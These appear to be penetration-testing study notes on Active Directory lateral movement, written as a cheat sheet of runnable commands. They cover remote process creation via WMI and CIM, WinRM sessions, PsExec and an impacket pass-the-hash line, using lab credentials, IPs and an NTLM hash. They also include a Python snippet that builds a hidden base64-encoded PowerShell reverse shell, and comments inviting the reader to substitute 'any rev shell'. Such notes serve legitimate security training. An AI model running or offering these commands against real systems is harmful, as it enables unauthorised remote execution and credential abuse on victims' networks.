# AD Lateral Movement Techniques
## WMI 
- Remote Procedure Calls (port 135)
- Req target host credential & that user admininistrator local group in target
- deprecated in realworld
- not restricted by UAC remote restriction for non-domain joined machines 
- Works in cmd & pwsh
### Cmd 
- Dont have direct output 
- Launch calculator remotely  ``` wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc" ```
### Powershell
1. Prep credential object
    ``` 
        $username = 'jen'; // modify this
        $password = 'Nexus123!'; // modify this
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    ```
2. Prep Cim Session
   ```
        $options = New-CimSessionOption -Protocol DCOM
        $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options // modify ip to new victim ip
        $command = 'calc';  // modify this to any rev shell or command
    ```
3. Prep Powershell Base64 Rev Shell
   ``` 
        import sys
        import base64

        payload = {reference https://www.revshells.com/ PowerShell #2 starting from "client....}

        cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

        print(cmd)
    ```
4. Run CIM
    ``` 
        Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
    ``` 

## WinRM
- WS-Management Protocol (xml messages w/ http&https)
- port 5986
- Req Administrators or Remote Management Users Group on target host
### Cmd
- Have output
- ``` winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami" ``` 

### Powershell
1. Prep credential object
    ``` 
        $username = 'jen'; // modify this
        $password = 'Nexus123!'; // modify this
        $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
    ```
2. Start session 
   ``` 
    New-PSSession -ComputerName {Target IP} -Credential $credential
    Enter-PSSession 1 // no need nc
   ```

## PsExec
- Require ADMIN$ share in SMB
- Require that user is admin local group of that machine
- Require file & printer sharing turned on
1. Exec ``` ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd ```

## Pass the hash
- With NTLM authN services only | Kerberos authN NOT WORK!!
- Abuse SMB again
- Run in kali ``` /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@{Target ip} ```

# AD Persistence
##